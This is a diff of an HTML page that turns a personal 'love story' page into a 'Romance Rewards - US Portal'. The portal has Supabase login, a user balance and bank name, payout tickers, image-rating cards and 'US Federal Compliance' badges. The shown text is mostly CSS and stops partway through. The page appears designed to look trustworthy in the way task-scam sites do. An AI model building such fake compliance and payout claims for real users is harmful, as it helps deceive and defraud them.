@@ -1,649 +1,1286 @@
 <!DOCTYPE html>
-<html lang="my">
+<html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Our Love Story ❤️</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Romance Rewards - US Portal</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+<!-- Supabase Script CDN (esm.sh version to fix module error) -->
+<script type="module">
+import { createClient } from 'https://esm.sh/@supabase/supabase-js@2'
+
+const supabaseUrl = 'https://acabwfzfvgdfzivikwei.supabase.co'
+const supabaseKey = 'sb_publishable_jKNqXvsRkY3uEC3B4gJi0w_9bpSBfOV'
+const supabase = createClient(supabaseUrl, supabaseKey)
+
+window.supabaseClient = supabase;
+
+// ၁။ User လော့အင်ဝင်တဲ့ ပုံစံ (Login လုပ်တဲ့ Form ထဲက ခလုတ်နဲ့ ချိတ်ဖို့)
+window.loginUser = async function(email, password) {
+const { data, error } = await supabase.auth.signInWithPassword({
+email: email,
+password: password,
+})
+
+if (error) {
+alert("လော့အင်ဝင်လို့ မအောင်မြင်ပါ: " + error.message)
+} else {
+alert("လော့အင် အောင်မြင်ပါတယ်!")
+loadCustomerFinancialData(data.user.id)
+currentUserEmail = email;
+let emailDisplay = document.getElementById("nav-email-display");
+let avatarLetter = document.getElementById("user-avatar-letter");
+if(emailDisplay) emailDisplay.innerText = email;
+if(avatarLetter) avatarLetter.innerText = email.charAt(0).toUpperCase();
+switchPage('dashboard-page');
+}
+}
+
+// ၂။ User အကောင့်အသစ်ဖွင့်တဲ့ ပုံစံ (Sign Up)
+window.signUpUser = async function(email, password) {
+const { data, error } = await supabase.auth.signUp({
+email: email,
+password: password,
+})
+
+if (error) {
+alert("အကောင့်ဖွင့်လို့ မအောင်မြင်ပါ: " + error.message)
+} else {
+alert("အကောင့် အောင်မြင်စွာ ဖွင့်ပြီးပါပြီ!")
+currentUserEmail = email;
+let emailDisplay = document.getElementById("nav-email-display");
+let avatarLetter = document.getElementById("user-avatar-letter");
+if(emailDisplay) emailDisplay.innerText = email;
+if(avatarLetter) avatarLetter.innerText = email.charAt(0).toUpperCase();
+switchPage('dashboard-page');
+}
+}
+
+// ၃။ Database ထဲက ဒေတာတွေ လှမ်းထုတ်မယ့် ပုံစံ
+async function loadCustomerFinancialData(userId) {
+const { data, error } = await supabase
+.from('Profiles')
+.select('*')
+.eq('id', userId)
+.single()
+
+if (error) {
+console.log("ဒေတာဆွဲထုတ်လို့ မရသေးပါ", error)
+} else {
+console.log("ငွေပမာဏ:", data.balance)
+console.log("ဘဏ်နာမည်:", data.bank_name)
+
+if(data.balance !== undefined) {
+userBalance = data.balance;
+document.getElementById("user-balance").innerText = userBalance.toFixed(2);
+document.getElementById("statement-balance").innerText = userBalance.toFixed(2);
+updateProgressBar(userBalance);
+}
+}
+}
+
+// ၄။ အကောင့်ဝင်ပြီးသားဖြစ်ရင် အလိုအလျောက် စစ်ပေးမယ့်စနစ်
+window.addEventListener('DOMContentLoaded', async () => {
+const { data: { session } } = await supabase.auth.getSession()
+if (session) {
+loadCustomerFinancialData(session.user.id)
+currentUserEmail = session.user.email;
+let emailDisplay = document.getElementById("nav-email-display");
+let avatarLetter = document.getElementById("user-avatar-letter");
+if(emailDisplay) emailDisplay.innerText = currentUserEmail;
+if(avatarLetter) avatarLetter.innerText = currentUserEmail.charAt(0).toUpperCase();
+}
+})
+</script>
+
 <style>
-body {
-background: linear-gradient(135deg, #1e3c72, #2a5298, #1a2a6c);
-font-family: 'Noto Sans Myanmar', sans-serif;
-display: flex;
-flex-direction: column;
-justify-content: center;
-align-items: center;
-min-height: 100vh;
-margin: 0;
-overflow-x: hidden;
-position: relative;
-transition: background 1s ease;
-}
+/* Dark Neon Purple & White Theme Styles */
+* { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+body { background-color: #0f172a; color: #f8fafc; min-height: 100vh; }
+.page { display: none; width: 100%; min-height: 100vh; }
+.page.active { display: flex; flex-direction: column; }
 
-/* ☁️ တိမ်တိုက်ပေါ်ရောက်နေသော နောက်ခံပုံစံနှင့် ရာသီဥတု ၄ မျိုး 🌤️🌧️💨❄️ */
-.weather-container {
-position: absolute;
-width: 100%;
-height: 100%;
-top: 0;
-left: 0;
-pointer-events: none;
-overflow: hidden;
-z-index: 2;
-opacity: 0;
-transition: opacity 1.5s ease-in-out;
-}
-
-.weather-container.active {
-opacity: 1;
-}
-
-#sunWeather {
-background: linear-gradient(to bottom, #2980b9, #6dd5fa, #white);
-}
-.sun-element {
-position: absolute;
-top: 25px;
-right: 35px;
-font-size: 55px;
-animation: rotateSun 20s linear infinite;
-filter: drop-shadow(0 0 25px #ffeb3b);
-}
-@keyframes rotateSun {
-0% { transform: rotate(0deg); }
-100% { transform: rotate(360deg); }
-}
-.cloud-white {
-position: absolute;
-font-size: 40px;
-opacity: 0.85;
-animation: floatCloud 15s linear infinite;
-}
-@keyframes floatCloud {
-0% { transform: translateX(-50px); }
-100% { transform: translateX(110vw); }
-}
-
-#rainWeather {
-background: linear-gradient(to bottom, #34495e, #2c3e50, #1a252f);
-}
-.rain-cloud-dark {
-position: absolute;
-top: 20px;
-font-size: 50px;
-filter: drop-shadow(0 0 10px #222);
-animation: floatCloud 12s linear infinite;
-}
-.raindrop {
-position: absolute;
-background: #00ffff;
-width: 2px;
-height: 18px;
-opacity: 0.7;
-animation: fallRain 0.5s linear infinite;
-}
-@keyframes fallRain {
-0% { transform: translateY(0); }
-100% { transform: translateY(100vh); }
-}
-
-#windWeather {
-background: linear-gradient(to bottom, #4ca1af, #2c3e50);
-}
-.wind-cloud {
-position: absolute;
-font-size: 45px;
-animation: blowWindCloud 6s linear infinite;
-}
-@keyframes blowWindCloud {
-0% { transform: translateX(-100px) translateY(0); opacity: 0.2; }
-50% { opacity: 1; }
-100% { transform: translateX(110vw) translateY(30px); opacity: 0.2; }
-}
-
-#snowWeather {
-background: linear-gradient(to bottom, #2c3e50, #bdc3c7, #2c3e50);
-}
-.snowflake {
-position: absolute;
+/* Global Top Announcement Ticker (English) */
+.global-announcement-ticker {
+background: linear-gradient(135deg, #8A00F5, #E000FF);
+border-bottom: 2px solid #1e293b;
 color: #ffffff;
-font-size: 16px;
-opacity: 0.8;
-animation: fallSnow 3s linear infinite;
-}
-@keyframes fallSnow {
-0% { transform: translateY(-20px) rotate(0deg); }
-100% { transform: translateY(100vh) rotate(360deg); }
-}
-
-/* 💖 ကိုကိုက မီးမီးကို အသည်းပုံပေးခြင်း နှင့် မီးမီးက အာဘွားပစ်သည့် အန်နီမေးရှင်း */
-.love-action-container {
-position: absolute;
-width: 100%;
-height: 100%;
+padding: 8px 12px;
+font-size: 0.8rem;
+font-weight: 700;
+text-align: center;
+position: sticky;
 top: 0;
-left: 0;
-pointer-events: none;
-z-index: 15;
-overflow: hidden;
+z-index: 1000;
+box-shadow: 0 4px 15px rgba(138, 0, 245, 0.3);
 }
 
-.flying-heart-boy {
-position: absolute;
-bottom: 250px;
-left: 20%;
-font-size: 32px;
-opacity: 0;
-animation: sendHeartFromBoy 4s ease-in-out infinite;
-}
-@keyframes sendHeartFromBoy {
-0% { transform: translate(0, 0) scale(0.5); opacity: 0; }
-20% { opacity: 1; transform: translate(60px, -50px) scale(1.3); }
-80% { opacity: 1; transform: translate(150px, -120px) scale(1); }
-100% { transform: translate(220px, -170px) scale(0.2); opacity: 0; }
-}
+/* Landing Page */
+#landing-page { padding: 15px 20px; justify-content: center; align-items: center; text-align: center; min-height: 100vh; gap: 8px; background: #0f172a; }
+.landing-header h1 { font-size: 1.8rem; background: linear-gradient(135deg, #E000FF 0%, #FFFFFF 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 2px; font-weight: 800; letter-spacing: 0.5px; }
+.landing-header p { font-size: 0.75rem; color: #94a3b8; margin-bottom: 6px; }
 
-.flying-kiss-girl {
-position: absolute;
-bottom: 250px;
-right: 20%;
-font-size: 32px;
-opacity: 0;
-animation: sendKissFromGirl 4s ease-in-out infinite;
-animation-delay: 2s;
-}
-@keyframes sendKissFromGirl {
-0% { transform: translate(0, 0) scale(0.5); opacity: 0; }
-20% { opacity: 1; transform: translate(-60px, -50px) scale(1.3); }
-80% { opacity: 1; transform: translate(-150px, -120px) scale(1); }
-100% { transform: translate(-220px, -170px) scale(0.2); opacity: 0; }
-}
-
-.floating-container {
-position: absolute;
+.marquee-container, .marquee-container-payout {
 width: 100%;
-height: 100%;
-top: 0;
-left: 0;
-pointer-events: none;
-overflow: hidden;
-z-index: 1;
+max-width: 420px;
+background: #1e293b;
+border: 1px solid #8A00F5;
+border-radius: 20px;
+padding: 6px 10px;
+margin: 4px auto;
+color: #FFFFFF;
+font-size: 0.75rem;
+font-weight: 600;
+box-shadow: 0 0 12px rgba(138, 0, 245, 0.2);
+}
+.marquee-container-payout {
+background: #1e293b;
+border: 1px solid #10b981;
+color: #34d399;
 }
 
-.photo-wrapper {
-position: absolute;
-display: flex;
-flex-direction: column;
-align-items: center;
-animation: glitchFadeMove 8s ease-in-out infinite alternate;
+.poster-grid-preview {
+display: grid;
+grid-template-columns: repeat(4, 1fr);
+gap: 6px;
+width: 100%;
+max-width: 380px;
+margin: 6px auto;
 }
-
-.floating-photo {
-width: 90px;
-height: 90px;
-border-radius: 50%;
+.poster-grid-preview img {
+width: 100%;
+height: 52px;
 object-fit: cover;
-user-select: none;
+border-radius: 6px;
+border: 1px solid #8A00F5;
+transition: transform 0.2s ease;
+}
+.poster-grid-preview img:hover { transform: scale(1.05); }
+
+.trust-badges { display: flex; justify-content: center; gap: 12px; font-size: 0.75rem; color: #94a3b8; margin: 6px 0; }
+.trust-badges span { display: flex; align-items: center; gap: 4px; color: #FFFFFF; font-weight: 600; }
+
+.get-started-btn {
+background: linear-gradient(135deg, #8A00F5 0%, #E000FF 100%);
+color: #ffffff; border: none; padding: 12px 30px; font-size: 0.95rem;
+font-weight: 800; border-radius: 30px; cursor: pointer; width: 100%; max-width: 350px;
+box-shadow: 0 4px 20px rgba(138, 0, 245, 0.4); transition: all 0.3s ease; margin-bottom: 10px;
+}
+.get-started-btn:hover { transform: translateY(-2px); box-shadow: 0 6px 25px rgba(138, 0, 245, 0.6); }
+
+.signup-redirect-btn {
+background: transparent;
+color: #E000FF;
+border: 1px solid #8A00F5;
+padding: 10px 30px;
+font-size: 0.9rem;
+font-weight: 700;
+border-radius: 30px;
+cursor: pointer;
+width: 100%;
+max-width: 350px;
+transition: all 0.3s ease;
+}
+.signup-redirect-btn:hover {
+background: rgba(138, 0, 245, 0.15);
 }
 
-/* ဒုတိယစာမျက်နှာအတွက် ပုံအရွယ်အစားကို သေးငယ်စေရန် */
-.game-active .floating-photo {
-width: 55px;
-height: 55px;
+/* Auth Pages (Login & Signup Cards) */
+#login-page, #signup-page {
+align-items: center; justify-content: center; padding: 20px; min-height: 100vh;
+background: linear-gradient(rgba(15, 23, 42, 0.85), rgba(15, 23, 42, 0.92)), url('https://i.ibb.co/zhwdB8yv/PNG-image-101.png') no-repeat center center;
+background-size: cover;
 }
+.auth-card { background-color: rgba(30, 41, 59, 0.92); backdrop-filter: blur(10px); padding: 25px; border-radius: 16px; width: 100%; max-width: 400px; border: 1px solid #8A00F5; text-align: left; box-shadow: 0 10px 30px rgba(138, 0, 245, 0.25); }
+.auth-card h2 { color: #E000FF; margin-bottom: 5px; font-size: 1.5rem; font-weight: 700; }
+.auth-card p { color: #94a3b8; font-size: 0.85rem; margin-bottom: 20px; }
+.auth-input-group { margin-bottom: 15px; }
+.auth-input-group label { display: block; margin-bottom: 6px; font-size: 0.85rem; color: #f8fafc; font-weight: 600; }
+.auth-input-group input { width: 100%; padding: 12px; background-color: #0f172a; border: 1px solid #334155; color: #f8fafc; border-radius: 10px; font-size: 0.95rem; outline: none; transition: border-color 0.2s; }
+.auth-input-group input:focus { border-color: #E000FF; box-shadow: 0 0 8px rgba(224, 0, 255, 0.3); }
+.auth-submit-btn { background: linear-gradient(135deg, #8A00F5 0%, #E000FF 100%); color: #ffffff; border: none; padding: 12px; width: 100%; border-radius: 10px; font-weight: bold; font-size: 0.95rem; cursor: pointer; margin-bottom: 10px; box-shadow: 0 4px 15px rgba(138, 0, 245, 0.3); }
+.auth-back-btn { background: transparent; color: #94a3b8; border: 1px solid #334155; padding: 10px; width: 100%; border-radius: 10px; font-weight: 600; cursor: pointer; transition: all 0.2s; }
+.auth-back-btn:hover { background: #334155; color: #f8fafc; }
 
-.photo-emoji {
-font-size: 22px;
-margin-bottom: 4px;
-filter: drop-shadow(0 0 8px #fff);
+/* Dashboard */
+#dashboard-page { padding-bottom: 80px; display: none; background: #0f172a; }
+#dashboard-page.active { display: block; }
+.top-nav { display: flex; justify-content: space-between; align-items: center; padding: 14px 20px; background: #1e293b; position: sticky; top: 35px; z-index: 100; border-bottom: 1px solid #334155; box-shadow: 0 2px 10px rgba(0,0,0,0.2); }
+.menu-toggle-btn {
+background: #0f172a; border: 1px solid #8A00F5; color: #E000FF; width: 40px; height: 40px; border-radius: 12px;
+font-size: 1.2rem; cursor: pointer; display: flex; align-items: center; justify-content: center;
+box-shadow: 0 0 10px rgba(138, 0, 245, 0.2); transition: all 0.3s ease;
 }
+.menu-toggle-btn:hover { background: #8A00F5; color: #ffffff; box-shadow: 0 0 18px rgba(138, 0, 245, 0.5); transform: scale(1.05); }
+.user-profile-widget { display: flex; align-items: center; gap: 10px; background: #0f172a; padding: 5px 12px 5px 6px; border-radius: 30px; border: 1px solid #8A00F5; box-shadow: 0 2px 10px rgba(138, 0, 245, 0.1); }
+.user-avatar-circle { width: 34px; height: 34px; background: linear-gradient(135deg, #8A00F5 0%, #E000FF 100%); color: #ffffff; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 800; font-size: 0.95rem; box-shadow: 0 0 8px rgba(138, 0, 245, 0.4); }
+.user-email-text { font-size: 0.8rem; color: #f8fafc; font-weight: 600; }
 
-.game-active .photo-emoji {
-font-size: 15px;
-margin-bottom: 2px;
+/* SIDEBAR */
+.sidebar { position: fixed; top: 0; left: -320px; width: 310px; height: 100%; background-color: #1e293b; z-index: 2000; transition: left 0.35s cubic-bezier(0.4, 0, 0.2, 1); padding: 20px; box-shadow: 8px 0 25px rgba(0,0,0,0.3); display: flex; flex-direction: column; overflow-y: auto; border-right: 1px solid #334155; }
+.sidebar.open { left: 0; }
+.sidebar-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; border-bottom: 1px solid #334155; padding-bottom: 12px; }
+.sidebar-header h3 { background: linear-gradient(135deg, #E000FF 0%, #FFFFFF 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-size: 1.15rem; font-weight: 800; letter-spacing: 0.5px; }
+.close-menu-btn {
+background: #451a03; border: 1px solid #f87171; color: #f87171;
+width: 32px; height: 32px; border-radius: 50%; font-size: 1rem; cursor: pointer;
+display: flex; align-items: center; justify-content: center; transition: all 0.2s;
 }
-
-@keyframes glitchFadeMove {
-0% { opacity: 0.2; transform: translate(0, 0) scale(0.8); }
-50% { opacity: 1; transform: translate(50px, -30px) scale(1.1); }
-100% { opacity: 0.3; transform: translate(-40px, 40px) scale(0.9); }
+.close-menu-btn:hover { background: #dc2626; color: #fff; }
+.sidebar-menu-item {
+display: flex; align-items: center; gap: 14px; padding: 13px 16px; color: #f8fafc;
+background: #0f172a; border-radius: 12px;
+cursor: pointer; border: 1px solid #334155; font-weight: 600;
+margin-bottom: 12px; font-size: 0.88rem; transition: all 0.3s ease; box-shadow: 0 2px 8px rgba(0,0,0,0.2);
 }
+.sidebar-menu-item i { font-size: 1.1rem; width: 24px; text-align: center; color: #E000FF; }
+.sidebar-menu-item:hover {
+border-color: #8A00F5; background: #1e1b4b;
+transform: translateX(6px); box-shadow: 0 4px 15px rgba(138, 0, 245, 0.15); color: #FFFFFF;
+}
+.overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); display: none; z-index: 1500; backdrop-filter: blur(4px); }
+.overlay.active { display: block; }
 
-.border-cyan { border: 3px solid #00ffff; box-shadow: 0 0 15px #00ffff; }
-.border-yellow { border: 3px solid #ffcc00; box-shadow: 0 0 15px #ffcc00; }
-.border-lime { border: 3px solid #39ff14; box-shadow: 0 0 15px #39ff14; }
-.border-orange { border: 3px solid #ff6600; box-shadow: 0 0 15px #ff6600; }
-.border-purple { border: 3px solid #bf00ff; box-shadow: 0 0 15px #bf00ff; }
-.border-pink { border: 3px solid #ff007f; box-shadow: 0 0 15px #ff007f; }
-
-.content-box {
-text-align: center;
-position: relative;
-z-index: 20;
-padding: 10px 15px;
+/* US Federal Compliance & Logo-Style Circular Badges Section */
+.compliance-section {
+background: #0f172a;
+border: 1px solid #334155;
+border-radius: 14px;
+padding: 16px 12px;
+margin-top: auto;
+}
+.compliance-badge-main {
 display: flex;
-flex-direction: column;
 align-items: center;
-justify-content: center;
 gap: 12px;
-width: 420px;
-max-width: 95%;
-box-sizing: border-box;
+border-bottom: 1px solid #334155;
+padding-bottom: 10px;
+margin-bottom: 12px;
 }
-
-/* ✨ အပေါ်ဆုံးခေါင်းစဉ်စာသားအတွက် နီယွန်ဘောင်ဒီဇိုင်း (တစ်ကြောင်းတည်းဖြစ်အောင် ပြင်ပြီး) ✨ */
-.main-title-box {
-background: rgba(13, 27, 42, 0.75);
-border: 2px solid #00ffff;
-box-shadow: 0 0 15px rgba(0, 255, 255, 0.7), inset 0 0 10px rgba(0, 255, 255, 0.4);
-padding: 10px 12px;
-border-radius: 14px;
-width: 100%;
-box-sizing: border-box;
-margin-bottom: 2px;
-white-space: nowrap;
+.federal-logo {
+width: 38px;
+height: 38px;
+object-fit: contain;
+filter: drop-shadow(0 0 5px rgba(224, 0, 255, 0.3));
 }
-
-.main-title {
-font-size: 21px;
-font-weight: 900;
+.compliance-text h3 {
+font-size: 0.85rem;
+font-weight: 700;
+color: #E000FF;
+margin: 0 0 2px 0;
+}
+.compliance-text p {
+font-size: 0.68rem;
+color: #94a3b8;
 margin: 0;
-background: linear-gradient(to bottom, #ffffff, #ffdf73, #ffa500);
--webkit-background-clip: text;
--webkit-text-fill-color: transparent;
-filter: drop-shadow(0 0 10px rgba(255, 255, 255, 0.9));
-letter-spacing: 0.5px;
+line-height: 1.3;
 }
-
-.love-quote {
-font-size: 14px;
-font-weight: 900;
-margin: 6px 0 0 0;
-background: linear-gradient(to bottom, #ffffff, #ffcc00, #ff6600);
--webkit-background-clip: text;
--webkit-text-fill-color: transparent;
-filter: drop-shadow(0 0 10px rgba(255, 204, 0, 0.8));
-white-space: nowrap;
-}
-
-.game-title {
-font-size: 22px;
-font-weight: 900;
-margin-bottom: 10px;
-background: linear-gradient(to bottom, #ffffff, #ffcc00);
--webkit-background-clip: text;
--webkit-text-fill-color: transparent;
-filter: drop-shadow(0 0 15px rgba(255, 215, 0, 0.9));
-}
-
-.control-box {
-display: flex;
-flex-direction: column;
-gap: 8px;
-width: 100%;
-}
-
-.primary-btn {
-background: linear-gradient(45deg, #00ffff, #39ff14);
-color: #0d1b2a;
-border: none;
-padding: 12px;
-border-radius: 12px;
-cursor: pointer;
-font-size: 15px;
-font-weight: 900;
-box-shadow: 0 0 20px rgba(0, 255, 255, 0.8), 0 0 10px #39ff14;
-transition: 0.2s;
-width: 100%;
-box-sizing: border-box;
-}
-
-.primary-btn:hover {
-transform: scale(1.03);
-}
-
-.music-btn {
-background-color: rgba(13, 27, 42, 0.8);
-color: #00ffff;
-border: 2px solid #00ffff;
-padding: 8px;
-border-radius: 10px;
-cursor: pointer;
-font-size: 13px;
-font-weight: bold;
-width: 100%;
-box-sizing: border-box;
-box-shadow: 0 0 10px rgba(0, 255, 255, 0.4);
-}
-
-/* ✨ မေးခွန်းစာသားအတွက် နီယွန်ဘောင်ဒီဇိုင်း ✨ */
-.question-box {
-font-size: 16px;
-color: #ffffff;
-background: rgba(13, 27, 42, 0.8);
-border: 2px solid #ff007f;
-box-shadow: 0 0 15px rgba(255, 0, 127, 0.8), inset 0 0 10px rgba(255, 0, 127, 0.4);
-padding: 12px 15px;
-border-radius: 14px;
-margin-bottom: 15px;
-min-height: 45px;
-display: flex;
-align-items: center;
-justify-content: center;
-width: 100%;
-box-sizing: border-box;
-font-weight: 900;
-text-shadow: 0 0 10px rgba(255, 255, 255, 0.8);
-text-align: center;
-}
-
-.choices-container {
-display: flex;
-justify-content: space-around;
-margin-bottom: 10px;
-width: 100%;
+.verified-partners-grid {
+display: grid;
+grid-template-columns: repeat(3, 1fr);
 gap: 10px;
 }
-
-.choice-card {
+.partner-card {
+background: #1e293b;
+border: 1px solid #334155;
+border-radius: 12px;
+padding: 10px 6px;
+display: flex;
+flex-direction: column;
+align-items: center;
+justify-content: center;
 cursor: pointer;
-display: flex;
-flex-direction: column;
-align-items: center;
+transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
 }
+.partner-card img {
+width: 36px;
+height: 36px;
+object-fit: contain;
+border-radius: 50%;
+background: #ffffff;
+padding: 4px;
+border: 1px solid #8A00F5;
+transition: transform 0.3s ease;
+}
+.partner-card:hover {
+background: #0f172a;
+border-color: #8A00F5;
+transform: translateY(-2px);
+box-shadow: 0 4px 15px rgba(138, 0, 245, 0.2);
+}
+.partner-card:hover img { transform: scale(1.1); }
 
-.avatar-container {
-position: relative;
-width: 110px;
-height: 175px;
-display: flex;
-flex-direction: column;
-align-items: center;
+/* Main Menu Navigation Container */
+.nav-menu-container {
+text-align: center;
+margin: 15px 0 5px 0;
 }
-
-.heart-head {
-width: 95px;
-height: 90px;
-object-fit: cover;
-clip-path: path('M47.5,85 C47.5,85 10,58 10,32 C10,15 21,7 34,7 C43,7 47.5,14 47.5,14 C47.5,14 52,7 61,7 C74,7 85,15 85,32 C85,58 47.5,85 47.5,85 Z');
-padding: 3px;
-box-sizing: border-box;
-z-index: 2;
-}
-
-.cartoon-body-full {
-position: absolute;
-top: 78px;
-width: 100px;
-height: 90px;
-z-index: 1;
-}
-
-.left-arm {
-animation: danceLeftArm 0.6s ease-in-out infinite alternate;
-transform-origin: 35px 12px;
-}
-.right-arm {
-animation: danceRightArm 0.6s ease-in-out infinite alternate;
-transform-origin: 65px 12px;
-}
-.left-leg {
-animation: danceLeftLeg 0.6s ease-in-out infinite alternate;
-transform-origin: 39px 52px;
-}
-.right-leg {
-animation: danceRightLeg 0.6s ease-in-out infinite alternate;
-transform-origin: 61px 52px;
-}
-
-@keyframes danceLeftArm {
-0% { transform: rotate(0deg); }
-100% { transform: rotate(-25deg) translateY(-3px); }
-}
-@keyframes danceRightArm {
-0% { transform: rotate(0deg); }
-100% { transform: rotate(25deg) translateY(-3px); }
-}
-@keyframes danceLeftLeg {
-0% { transform: rotate(0deg); }
-100% { transform: rotate(15deg); }
-}
-@keyframes danceRightLeg {
-0% { transform: rotate(0deg); }
-100% { transform: rotate(-15deg); }
-}
-
-/* ✨ ကိုကို/မီးမီး နာမည်စာသားများအတွက် နီယွန်ဘောင်ဒီဇိုင်း ✨ */
-.choice-name-badge {
-margin-top: 8px;
-padding: 6px 12px;
-background: rgba(13, 27, 42, 0.85);
-border: 2px solid #00ffff;
-border-radius: 12px;
-box-shadow: 0 0 12px rgba(0, 255, 255, 0.7);
-font-weight: 900;
-font-size: 15px;
-background: linear-gradient(to bottom, #ffffff, #ffcc00);
--webkit-background-clip: text;
--webkit-text-fill-color: transparent;
-filter: drop-shadow(0 0 8px rgba(255, 204, 0, 0.9));
-}
-
-.result-box {
-font-size: 15px;
+.main-menu-btn {
+background: linear-gradient(135deg, #8A00F5 0%, #E000FF 100%);
 color: #ffffff;
-font-weight: 900;
-margin-bottom: 12px;
-min-height: 25px;
-text-shadow: 0 0 12px #00ffff;
+border: none;
+padding: 10px 22px;
+font-size: 0.85rem;
+font-weight: 700;
+border-radius: 20px;
+cursor: pointer;
+box-shadow: 0 4px 15px rgba(138, 0, 245, 0.3);
+transition: all 0.3s ease;
+width: 100%;
+}
+.main-menu-btn:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(138, 0, 245, 0.5); }
+
+.dashboard-content { padding: 18px 20px; }
+.banner-earn {
+background: #1e293b; border: 1px solid #8A00F5;
+padding: 16px; border-radius: 18px; margin-bottom: 18px; text-align: center; color: #f8fafc; box-shadow: 0 10px 30px rgba(138, 0, 245, 0.15);
+}
+@keyframes fadeInOut {
+0% { opacity: 0.4; transform: scale(0.98); }
+50% { opacity: 1; transform: scale(1); }
+100% { opacity: 0.4; transform: scale(0.98); }
+}
+.fading-title { animation: fadeInOut 3s infinite ease-in-out; font-size: 1.15rem; color: #E000FF; font-weight: 800; margin-bottom: 4px; }
+.banner-earn p { font-size: 0.78rem; margin-bottom: 8px; color: #94a3b8; }
+.balance-box { background: #064e3b; border: 1px solid #10b981; padding: 6px 14px; border-radius: 20px; display: inline-block; margin-top: 8px; font-weight: 800; font-size: 0.9rem; color: #34d399; box-shadow: 0 0 12px rgba(16, 185, 129, 0.2); }
+
+/* Quick Filters & Live Statistics Section */
+.dashboard-stats-filter {
+display: grid;
+grid-template-columns: repeat(2, 1fr);
+gap: 12px;
+margin-bottom: 18px;
+}
+.stat-card-box {
+background: #1e293b;
+border: 1px solid #8A00F5;
+border-radius: 14px;
+padding: 12px;
+text-align: center;
+box-shadow: 0 4px 12px rgba(138, 0, 245, 0.1);
+}
+.stat-card-box h4 {
+font-size: 0.75rem;
+color: #94a3b8;
+margin-bottom: 4px;
+font-weight: 600;
+}
+.stat-card-box span {
+font-size: 1.1rem;
+font-weight: 800;
+color: #FFFFFF;
 }
 
-.result-box.active {
-background: linear-gradient(135deg, rgba(0, 255, 255, 0.1), rgba(255, 0, 127, 0.1));
-border: 1px solid rgba(0, 255, 255, 0.5);
-padding: 10px;
-border-radius: 12px;
+.quick-filters-container {
+display: flex;
+gap: 8px;
+overflow-x: auto;
+padding-bottom: 6px;
+margin-bottom: 16px;
+}
+.filter-btn {
+background: #1e293b;
+border: 1px solid #8A00F5;
+color: #FFFFFF;
+padding: 6px 14px;
+border-radius: 20px;
+font-size: 0.8rem;
+font-weight: 700;
+cursor: pointer;
+white-space: nowrap;
+transition: all 0.2s ease;
+}
+.filter-btn.active, .filter-btn:hover {
+background: #8A00F5;
+color: #ffffff;
+box-shadow: 0 2px 10px rgba(138, 0, 245, 0.3);
+}
+
+@keyframes pulseGlow {
+0% { opacity: 0.6; }
+50% { opacity: 1; }
+100% { opacity: 0.6; }
+}
+.section-title {
+font-size: 1.05rem; margin-bottom: 14px; color: #E000FF; border-left: 4px solid #8A00F5;
+padding-left: 10px; animation: pulseGlow 2.5s infinite ease-in-out; font-weight: 800;
+}
+.image-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 14px; }
+@media(min-width: 600px) { .image-grid { grid-template-columns: repeat(4, 1fr); } }
+.image-card { background-color: #1e293b; border-radius: 12px; overflow: hidden; cursor: pointer; border: 1px solid #334155; transition: all 0.3s ease; box-shadow: 0 4px 15px rgba(0,0,0,0.2); }
+.image-card:hover { transform: translateY(-4px); border-color: #8A00F5; box-shadow: 0 8px 25px rgba(138, 0, 245, 0.25); }
+.image-card img { width: 100%; height: 150px; object-fit: cover; }
+.image-info { padding: 10px; }
+.image-title { font-size: 0.85rem; font-weight: 700; margin-bottom: 4px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; color: #f8fafc; }
+.stars { color: #f59e0b; font-size: 0.8rem; }
+
+/* Detail Page */
+#detail-page { padding: 18px 20px; display: none; background: #0f172a; }
+#detail-page.active { display: block; }
+.back-btn { background: #1e293b; border: 1px solid #8A00F5; color: #FFFFFF; padding: 9px 16px; border-radius: 10px; cursor: pointer; display: flex; align-items: center; gap: 8px; margin-bottom: 16px; font-size: 0.9rem; font-weight: 600; transition: all 0.2s; }
+.back-btn:hover { background: #334155; }
+.detail-container { background-color: #1e293b; border-radius: 16px; padding: 20px; max-width: 480px; margin: 0 auto; border: 1px solid #8A00F5; box-shadow: 0 10px 30px rgba(138, 0, 245, 0.15); }
+.detail-img { width: 100%; height: 260px; object-fit: cover; border-radius: 10px; margin-bottom: 14px; border: 1px solid #334155; }
+.rating-box { background: #0f172a; padding: 15px; border-radius: 12px; text-align: center; margin-top: 14px; border: 1px solid #334155; }
+.star-rating { font-size: 2rem; color: #334155; cursor: pointer; margin-bottom: 14px; }
+.star-rating i.rated { color: #f59e0b; text-shadow: 0 0 10px rgba(245, 158, 11, 0.5); }
+.submit-rating-btn { background: linear-gradient(135deg, #8A00F5 0%, #E000FF 100%); color: #ffffff; border: none; padding: 12px; font-weight: 800; border-radius: 10px; cursor: pointer; width: 100%; font-size: 0.95rem; box-shadow: 0 4px 15px rgba(138, 0, 245, 0.3); }
+
+/* Common Sub-page & Form Styles */
+.sub-page-container { padding: 18px 20px; display: none; background: #0f172a; min-height: 100vh; }
+.sub-page-container.active { display: block; }
+.sub-card { background-color: #1e293b; border-radius: 16px; padding: 20px; max-width: 480px; margin: 0 auto; border: 1px solid #8A00F5; box-shadow: 0 10px 30px rgba(138, 0, 245, 0.15); }
+.secure-badge { background: #064e3b; border: 1px solid #10b981; color: #34d399; padding: 10px; border-radius: 10px; font-size: 0.82rem; text-align: center; margin-bottom: 14px; display: flex; align-items: center; justify-content: center; gap: 8px; font-weight: 600; }
+.form-group { margin-bottom: 14px; }
+.form-group label { display: block; margin-bottom: 6px; color: #FFFFFF; font-size: 0.88rem; font-weight: 600; }
